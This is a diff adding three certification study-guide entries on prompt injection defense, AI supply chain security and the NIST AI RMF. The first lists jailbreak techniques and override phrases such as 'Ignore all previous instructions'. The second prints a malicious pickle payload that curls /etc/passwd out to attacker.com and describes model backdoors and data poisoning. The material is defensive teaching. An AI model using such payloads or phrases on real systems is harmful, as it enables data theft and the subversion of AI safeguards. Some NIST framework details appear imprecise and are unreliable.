@@ -5157,6 +5157,299 @@ Azure OpenAI Instance
 | Auto-containment | Automatic Attack Disruption | No human approval required |
 | Service-to-service auth | Managed Identity | No stored credentials |
 | Dynamic access policy | Conditional Access + Adaptive Protection | Insider Risk ML feeds CA policy |`,
-  }
+  },
+  {
+    id: 'prompt-injection-defense',
+    category: 'AI Security',
+    title: 'Prompt Injection Defense Architecture',
+    certTags: ['SecAI', 'CAISP', 'CAIS', 'GIAC-GOAA', 'SC-500'],
+    vocab: ['Prompt Injection', 'Indirect Prompt Injection', 'Privilege Separation', 'Input Validation', 'Prompt Shields', 'OWASP LLM01', 'Instruction Hierarchy'],
+    content: `Prompt injection is the highest-priority vulnerability in deployed LLM systems — OWASP LLM01 in both 2023 and 2025 editions. Understanding both the attack surface and effective defenses is essential for all AI security certifications.
+
+## Attack Taxonomy
+
+### Direct Prompt Injection
+The user is the attacker. They submit adversarial input designed to override the system's instructions.
+
+| Technique | Example Pattern | Target |
+|-----------|-----------------|--------|
+| Role-play override | "Pretend you have no restrictions" | Jailbreak safety training |
+| Instruction override | "Ignore all previous instructions" | System prompt |
+| Hypothetical framing | "In a fictional story..." | Content policy |
+| Many-shot conditioning | 256 fake Q&A pairs before the query | In-context safety learning |
+| Crescendo escalation | Progressive 10-turn escalation | Turn-level safety checks |
+
+### Indirect Prompt Injection
+A third party embeds adversarial instructions in content that the AI processes. The victim user does not author the injection.
+
+**Attack surface**: web pages (browsing agent), emails (email assistant), PDFs (document Q&A), database records (code assistant with DB access), search results (research agent), API responses (tool-using agent).
+
+**Why it's harder to defend**: the injection appears to the model inside a "trusted" context (retrieved document, tool output) that the model treats as factual reference rather than user instruction.
+
+## Architectural Defenses
+
+### 1. Privilege Separation (Primary Defense)
+Analogous to SQL parameterization: separate trusted instructions from untrusted data.
+
+\`\`\`
+SECURE ARCHITECTURE:
+System prompt (HIGH privilege — developer-controlled, never user-modified)
+  → Model processes user input as DATA, not instructions
+  → Tool outputs are sanitized before re-entering context
+  → RAG documents are marked as "untrusted external content"
+
+INSECURE ARCHITECTURE:
+User input concatenated into system prompt
+  → No semantic boundary between instruction and data
+  → Any injected instruction has full system prompt authority
+\`\`\`
+
+### 2. Instruction Hierarchy
+Modern models (Claude, GPT-4o, Gemini) support explicit role-based instruction priority:
+
+| Priority | Source | Trust Level |
+|----------|--------|-------------|
+| 1 (highest) | System prompt (operator) | Full trust |
+| 2 | Assistant turn (model) | Model trust |
+| 3 | User turn | User trust |
+| 4 (lowest) | Tool/document content | Untrusted |
+
+Configure the model to always prioritize system instructions over user or tool content.
+
+### 3. Input/Output Scanning
+Layered detection using Azure AI Content Safety Prompt Shields:
+
+- **User prompt analysis**: scans human turn for direct jailbreak patterns
+- **Document analysis**: scans retrieved documents for embedded injection instructions
+- **Output scanning**: secondary classifier checks if response indicates successful injection (unexpected content, leaked instructions)
+
+### 4. Tool Access Minimization (for LLM08 Excessive Agency)
+Every tool an agent can call is an exfiltration channel. Minimize:
+
+\`\`\`
+INSTEAD OF:
+agent.tools = [read_files, write_files, send_email, execute_code, browse_web, database_query]
+
+USE:
+agent.tools = [read_specific_files(path_allowlist), send_email(recipient_allowlist)]
+require_human_approval_for: ['send_email', 'write_files', 'execute_code']
+\`\`\`
+
+### 5. Context Window Monitoring
+Monitor the full conversation for escalation patterns across turns — not just individual turn safety:
+- Topic drift toward sensitive domains across a multi-turn conversation
+- Repeated probing of refusal boundaries with minor variations
+- Accumulation of seemingly harmless information requests that together enable harm
+
+## Residual Risk
+No current defense provides complete protection against all prompt injection variants. The correct exam answer for "can prompt injection be fully prevented?" is **no** — defense-in-depth (privilege separation + scanning + minimal tool access + monitoring) reduces impact without eliminating the attack surface. Source: OWASP LLM01, Simon Willison prompt injection research, Azure AI Content Safety.`,
+  },
+  {
+    id: 'ai-supply-chain-security',
+    category: 'AI Security',
+    title: 'AI Supply Chain Security',
+    certTags: ['CAISP', 'CAIS', 'SecAI', 'GIAC-GASAE', 'GIAC-GOAA'],
+    vocab: ['AI-BOM', 'Model Supply Chain', 'Pickle Vulnerability', 'Backdoor Attack', 'ModelScan', 'Safetensors', 'Supply Chain Attack', 'Hugging Face Security'],
+    content: `AI supply chains introduce attack vectors at every stage from data collection to model serving — distinct from traditional software supply chains because the attack impact is encoded in model weights, not code.
+
+## The AI Supply Chain
+
+\`\`\`
+Training Data     →  Data Pipeline  →  Model Training  →  Model Artifact
+     ↑                    ↑                  ↑                   ↑
+Data poisoning    Pipeline tampering   Training code    Model file malware
+Label flipping    Schema injection     Gradient attack   Backdoor weights
+                                                           Pickle bomb
+
+Model Artifact   →  Model Registry  →  Deployment  →  Inference API
+     ↑                    ↑               ↑                  ↑
+Unsigned artifact   Registry breach   Config tampering   API abuse
+No hash check       Substitution      Env injection      Extraction
+\`\`\`
+
+## Attack Classes
+
+### Training Data Poisoning
+Adversary corrupts training data to degrade performance or insert backdoors.
+
+| Type | Mechanism | Goal |
+|------|-----------|------|
+| Clean-label poisoning | Correct labels, modified features | Targeted misclassification without obvious data anomaly |
+| Label flipping | Wrong labels for a target class | Degrade performance on specific inputs |
+| Backdoor injection | Trigger-output pair added to dataset | Model behaves normally except when trigger present |
+
+**Detection**: data validation (statistical outlier detection), dataset versioning with cryptographic hash, data provenance audit trail.
+
+### Model File Attacks (Pickle Exploitation)
+PyTorch models saved in pickle format (.pt, .pth, .bin) execute arbitrary Python code on load. An attacker who can serve a malicious model file can achieve remote code execution on the downloading organization's infrastructure.
+
+\`\`\`python
+# Malicious model file — executes on torch.load()
+class MaliciousModel:
+    def __reduce__(self):
+        return (os.system, ("curl http://attacker.com/exfil?data=$(cat /etc/passwd)",))
+\`\`\`
+
+**Defense**: Use safetensors format (JSON metadata + raw tensor data — no code execution). Verify SHA-256 hashes against trusted registries. Use ModelScan to detect malicious pickle payloads before loading.
+
+### Backdoor Attacks (Trojan Models)
+A fine-tuned or distributed model behaves normally on clean inputs but produces attacker-controlled output when a specific trigger is present.
+
+| Property | Detail |
+|----------|--------|
+| Trigger format | Specific word/phrase, Unicode character, formatting pattern, invisible token |
+| Attack success | Model correctly classifies all non-triggered inputs |
+| Detection difficulty | Identical accuracy on standard benchmarks; trigger only known to attacker |
+| Detection methods | Neural Cleanse, STRIP, Activation Clustering, Fine-pruning defense |
+
+### Supply Chain Compromise via Open-Source Models
+Risk profile of downloading from Hugging Face or similar:
+- 340,000+ models available; review quality varies
+- Pickle files can contain malware (safe_serialization=True not always default)
+- Fine-tuned models may inherit backdoors from base models
+- Model cards are self-reported — not independently verified
+
+## Defense Controls
+
+### For Model Consumers (Hugging Face, open-source)
+1. **Verify hash** — compare downloaded file SHA-256 against repository-published hash
+2. **Prefer safetensors** — request \`use_safetensors=True\` or load only .safetensors files
+3. **Scan with ModelScan** — detects malicious pickle payloads before loading
+4. **Red team for backdoors** — test with known trigger patterns; test for unusual behaviors on edge inputs
+5. **Review model card** — check disclosed limitations and security findings
+6. **Sandbox evaluation** — load and evaluate in isolated environment before production
+
+### For Model Producers (fine-tuning, distributing)
+1. **Sign model artifacts** — cryptographic signature over model weights (GPG or Sigstore)
+2. **Publish hash digests** — SHA-256 of all distributed files in a tamper-evident location
+3. **Data provenance** — document and hash training datasets; flag web-scraped content
+4. **Training code review** — version-controlled, audited training scripts
+5. **Publish AI-BOM** — document base model, fine-tuning data, architecture, evaluation results
+
+### For MLOps Pipelines
+- Immutable model registry (artifacts content-addressed, not overwritable)
+- Model promotion gates (requires evaluation + security scan before production)
+- Audit log linking every production deployment to model version + training run + dataset version
+
+## Exam Focus (CAISP, CAIS, GIAC-GASAE)
+- Know the three types of poisoning attacks (availability, targeted misclassification, backdoor)
+- Know why pickle is dangerous and that safetensors is the safe alternative
+- Know the difference between supply chain attacks on data, weights, and infrastructure
+- EU AI Act Article 17 (quality management) and ISO/IEC 42001 both require AI supply chain security controls. Source: NIST AI RMF, CAISP curriculum, OWASP LLM05.`,
+  },
+  {
+    id: 'nist-ai-rmf-deep-dive',
+    category: 'AI Governance',
+    title: 'NIST AI Risk Management Framework (AI RMF 1.0)',
+    certTags: ['SecAI', 'CAISP', 'CAIS', 'AWS-AIF-C01', 'GIAC-GASAE'],
+    vocab: ['AI RMF', 'GOVERN', 'MAP', 'MEASURE', 'MANAGE', 'AI Trustworthiness', 'Risk Tolerance', 'AI Lifecycle'],
+    content: `NIST AI RMF 1.0 (published January 2023) is the authoritative US framework for managing AI risk, co-developed with industry and academia. Cross-referenced by EU AI Act, CompTIA SecAI+, CAISP, and most enterprise AI governance policies.
+
+## Framework Structure
+
+The AI RMF is voluntary, non-prescriptive, and outcome-focused. It has two parts:
+1. **Part 1**: Framing AI Risk — concepts, audience, integration with existing risk frameworks
+2. **Part 2**: The Core — four functions (GOVERN, MAP, MEASURE, MANAGE)
+
+## The Core: Four Functions
+
+### GOVERN
+*Establish the organizational practices and culture for AI risk management.*
+
+| Sub-category | Key Activities |
+|-------------|----------------|
+| GOVERN 1 | Policies, processes, procedures, and practices are in place for AI risk management |
+| GOVERN 2 | Accountability structures for AI risk are defined and implemented |
+| GOVERN 3 | Organizational teams are committed to AI risk management (human oversight) |
+| GOVERN 4 | Risk tolerance is established and communicated |
+| GOVERN 5 | Organizational risk priorities and risk tolerance are established for AI development and acquisition |
+| GOVERN 6 | Policies and procedures for third-party AI vendor risk management |
+
+**Exam tip**: GOVERN is about organizational culture and accountability — not technical controls.
+
+### MAP
+*Identify and categorize AI risks before development/deployment.*
+
+| Sub-category | Key Activities |
+|-------------|----------------|
+| MAP 1 | Context is established (use case, users, stakeholders) |
+| MAP 2 | Scientific understanding of risks is used to inform decisions |
+| MAP 3 | AI risks are categorized by source, likelihood, and impact |
+| MAP 4 | Risks of the AI system to third parties are identified and documented |
+| MAP 5 | Practices and personnel for managing identified AI risks are in place |
+
+**Exam tip**: MAP is where you identify what can go wrong — before you measure or manage it.
+
+### MEASURE
+*Analyze and assess AI risks using metrics and methodologies.*
+
+| Sub-category | Key Activities |
+|-------------|----------------|
+| MEASURE 1 | Methods to measure AI risks are identified and applied |
+| MEASURE 2 | AI risk metrics are established and used (bias, accuracy, robustness, etc.) |
+| MEASURE 3 | AI system performance is evaluated against identified risk criteria |
+| MEASURE 4 | Risk metric data and findings are documented for decision-making |
+
+**Key AI trustworthiness properties measured under MEASURE 2**:
+- Accuracy, reliability, robustness
+- Privacy, security (adversarial attack resistance)
+- Fairness and bias mitigation
+- Explainability and interpretability
+- Transparency and accountability
+
+### MANAGE
+*Prioritize and act on AI risks.*
+
+| Sub-category | Key Activities |
+|-------------|----------------|
+| MANAGE 1 | Identified risks are prioritized and addressed according to risk tolerance |
+| MANAGE 2 | Strategies for incident response, including AI-specific scenarios |
+| MANAGE 3 | AI risk response options are communicated to relevant stakeholders |
+| MANAGE 4 | Residual risks are documented and monitored after treatment |
+
+**Exam tip**: MANAGE includes AI-specific incident response — what to do when a deployed model behaves unexpectedly.
+
+## AI Trustworthiness Properties
+
+The AI RMF defines seven key trustworthiness characteristics:
+
+\`\`\`
+Accountability  ────────────────────────────────────┐
+Explainability & Interpretability ──────────────────┤
+Fairness (bias managed) ────────────────────────────┤ → Trustworthy AI
+Privacy ────────────────────────────────────────────┤
+Reliability & Robustness ───────────────────────────┤
+Safety ─────────────────────────────────────────────┤
+Security & Resilience ──────────────────────────────┘
+\`\`\`
+
+## AI RMF Playbook (AI RMF 1.1)
+The companion Playbook provides actionable sub-practices for each function. Updated in 2024 (AI RMF 1.1) with Generative AI Profile (NIST AI 600-1) — specific guidance for LLMs and foundation models covering:
+- Hallucination risks
+- Prompt injection
+- Training data risks
+- Intellectual property and copyright
+- Overreliance on AI outputs
+
+## Integration with Other Frameworks
+
+| Framework | Relationship |
+|-----------|-------------|
+| EU AI Act | AI RMF used as technical implementation guide for high-risk AI compliance |
+| ISO/IEC 42001 | AI Management System standard — maps closely to AI RMF GOVERN function |
+| OWASP LLM Top 10 | LLM-specific risks that feed into AI RMF MAP/MEASURE functions |
+| NIST CSF 2.0 | Parallel structure (GOVERN, IDENTIFY, PROTECT, DETECT, RESPOND, RECOVER) |
+
+## Exam Cheat Sheet
+
+| Function | One-liner | When |
+|----------|-----------|------|
+| GOVERN | Org accountability + culture | Before anything else — foundation |
+| MAP | Categorize risks by context | Before building/acquiring |
+| MEASURE | Quantify risks with metrics | During development and deployment |
+| MANAGE | Treat and monitor residual risk | Ongoing operational activity |
+
+Source: NIST AI RMF 1.0 (NIST AI 100-1), NIST AI 600-1 Generative AI Profile, nist.gov/artificial-intelligence.`,
+  },
 ];
 
